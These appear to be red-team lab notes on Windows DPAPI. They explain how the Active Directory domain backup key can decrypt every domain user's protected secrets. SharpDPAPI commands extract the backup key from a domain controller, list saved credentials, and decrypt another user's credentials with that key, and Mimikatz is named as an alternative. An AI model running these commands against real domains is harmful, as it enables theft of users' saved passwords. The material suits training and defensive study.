DPAPI protects secrets (e.g., Windows Credential Manager credentials) using randomly generated AES masterkeys, which encrypt the actual data. Masterkeys are protected using keys derived from the user's password.

- Password changes: Can prevent the user's current password from decrypting existing masterkeys.
- Backup key: Active Directory stores a domain DPAPI backup key that encrypts a backup copy of each user's masterkey, allowing recovery after password changes.
- Impact: Obtaining the domain backup key can enable decryption of DPAPI-protected secrets across domain users, including saved credentials.
- Persistence: The key is generated when the domain is created and is not automatically rotated. There is no officially supported method for changing it.
- Extraction: A domain administrator can retrieve it from a DC using the BackupKey Remote Protocol. Tools: Mimikatz (`lsadump::backupkeys`) and SharpDPAPI (`backupkey`).

```
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey
```

With local admin access to a computer, an adversary can enumerate saved credentials for all users.
```
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials
```

The `/rpc` method will not work in this case, because dyork cannot recover the masterkey for pchilds.  Instead, we use the domain's master backup key to decrypt the credentials via the `/pvk` parameter.
```
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /pvk:HvG1s[...snip...]lXQns=
```
